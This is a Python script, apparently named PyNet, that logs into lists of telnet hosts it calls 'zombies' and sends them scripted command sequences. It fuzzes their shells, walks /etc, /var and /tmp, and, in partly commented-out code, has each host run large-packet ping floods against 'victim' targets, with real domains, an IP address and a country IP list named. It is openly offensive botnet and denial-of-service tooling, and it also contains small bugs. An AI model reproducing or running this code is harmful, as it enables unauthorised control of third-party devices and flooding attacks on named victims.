#!/usr/bin/env python3

# This script perform telnet connections using socket instead of telnetlib.
# The intention is to execute command sequences quickly, even perform fuzzing techniques.
# Save logs and analyze output for creation of more command sequences.

import os
import sys
import time
import random
import signal
import argparse
import threading

# Personal packages
from utils.colors import Colors
from sockets.sconnection import telnet_auth_sequence, socket_send_data, socket_send_sequence, socket_send_command
from parsing.wap_commands import pseudo_tree
from commands.telnet_combinations import *
#from commands.fuzzing_combinations import fuzz_netstat, fuzz_ansi, fuzz_terminal_type, fuzz_ftp, fuzz_tree, fuzz_arping, fuzz_special_chars, scan_ping, scan_ping2, attack_ping
from commands.fuzzing_combinations import *
from commands.ping_combinations import ping_attack

# Global variable to track remote sockets
remote_sockets = []

def exit_gracefully():
    print("\n\n[!] Exiting gracefully...")

    for remote_socket in remote_sockets:
        try:
            remote_socket.close()
        except:
            continue
    sys.exit(0)

# Signal handler function to catch Ctrl+C
def signal_handler(sig, frame):
    exit_gracefully()

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)


# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="PyNet - A Python-based tool for telnet and network operations.")
    parser.add_argument("-iL", "--ip_list", help="\t\tPath to a file containing a list of IP addresses or hostnames, one per line.")
    parser.add_argument("-i", "--ip", help="\t\tTarget IP address or hostname to authenticate with.")
    parser.add_argument("-p", "--port", default=23, type=int, help="\t\tTarget port (default is 23 for Telnet).")
    parser.add_argument("-l", "--login", action="store_true", help="\tSimply login on the target system.")
    parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks (IP collection or domain name).")
    return parser.parse_args()


# Main method
def main():

    global target

    # Parse command-line arguments
    args = parse_arguments()

    if args.victim:
        target = args.victim.encode('ascii')

    # Option -i is provided
    if args.ip and args.port:

        # Perform a single telnet connection
        if args.login:

            # Retrieve fuzz list
            #commands_seq = fuzz_netstat(1000000)
            #commands_seq = fuzz_ansi()
            #commands_seq = fuzz_terminal_type()
            commands_seq = fuzz_ftp()
            #commands_seq = fuzz_tree()
            #commands_seq = fuzz_arping()
            #commands_seq = fuzz_special_chars()
            

            # Handle single session
            handle_target(args.ip, args.port, commands_seq29, 0.1, True) # Log executed commands with True


    # Option -iL is provided
    elif args.ip_list and args.port and args.login:
        # Read the IP list file and iterate through the IP addresses
        ip_list_path = args.ip_list
        with open(ip_list_path, 'r') as file:
            ip_addresses = file.read().splitlines()

            # Shuffle the list randomly
            random.shuffle(ip_addresses)

        # Close the read file properly
        file.close()

        # Construct the ping commands
        ecuador_ips = ""
        if args.victim and os.path.exists(args.victim) is True:
            #ecuador_ips = "/mnt/Kali/home/grimaldi/Bash/Telnet/pynet/split/ecuador_ips.txt"
            ecuador_ips = os.path.join(args.victim)

            total_targets = 0
            with open(ecuador_ips, 'r') as file:
                for line in file:
                    total_targets += 1

            total_zombies = len(ip_addresses)
            targets_per_zombie = int(total_targets/total_zombies)
            print(f"[!] Total Zombies:\n\t[{total_zombies}]")
            print(f"[!] Total Targets:\n\t[{total_targets}]")
            print(f"[!] Total Targets per Zombie:\n\t[{targets_per_zombie}]")

            # Obtain the list of lists
            commands_list = scan_ping2(total_zombies, ecuador_ips, total_targets)

        ip_cont = 1
        for ip in ip_addresses:

            # Simply perform a telnet connection.
            if args.login:
                print(Colors.BOLD_WHITE + f"[{ip_cont}] Processing IP:\t[{ip}]" + Colors.R)
                ip_cont += 1

                # Fetch the respective list with ping commands
                #commands = commands_list.pop()
                #commands = attack_ping("dnschecker.org", 100)
                #commands_attack = ping_attack("caliente.mx", 1000)
                #commands_attack = ping_attack("45.8.148.88", 1000)


                # Spin up our client thread to handle incoming data
                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq29, 0.1, True))
                try:
                    target_handler.start()
                except:
                    continue

                # Delay time between threads
                delay = 1
                time.sleep(delay)

            #ip_cont += 1

    # Error case
    else:
        print("Error: Please provide either -iL or -i option to specify the target IP(s).")


# Handle each victim
def handle_target(ip, port, command_sequence, timeout=2, detail=True):

    # Setup logs feature
    log_dir =  os.getcwd() + "/logs/" 
    log_output = log_dir + ip + "_log"

    log_paths = log_dir + ip + "_paths"

    ## Create the dir if not exist
    if not os.path.exists(log_dir):
        os.makedirs(log_dir, exist_ok=True)

    # Create and append socket session
    remote_socket = telnet_auth_sequence(ip, port, log_output)      # log the auth sequence
    #remote_socket = telnet_auth_sequence(ip, port)                 # don't log the auth sequence
    remote_sockets.append(remote_socket)

    # Send sequence of commands
    response = socket_send_sequence(remote_socket, command_sequence, timeout, detail, log_output)

    #ping_command = b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n'
    #response = socket_send_command(remote_socket, ping_command, False)

    #response = ls(remote_socket, "/")
    #print(response)

    #pseudo_tree(remote_socket, "/var", 3, log_output, log_paths)
    #pseudo_tree(remote_socket, "/tmp", 3, log_output, log_paths)
    #pseudo_tree(remote_socket, "/etc", 3, log_output, log_paths)

    # Close the socket after command execution
    if remote_socket:
        try:
            remote_socket.close()
            # Remove the socket from the dictionary
            if remote_socket in remote_sockets:
                del remote_sockets[remote_socket]
        except:
            pass


# Main method
if __name__ == "__main__":
    main()

    exit_gracefully()
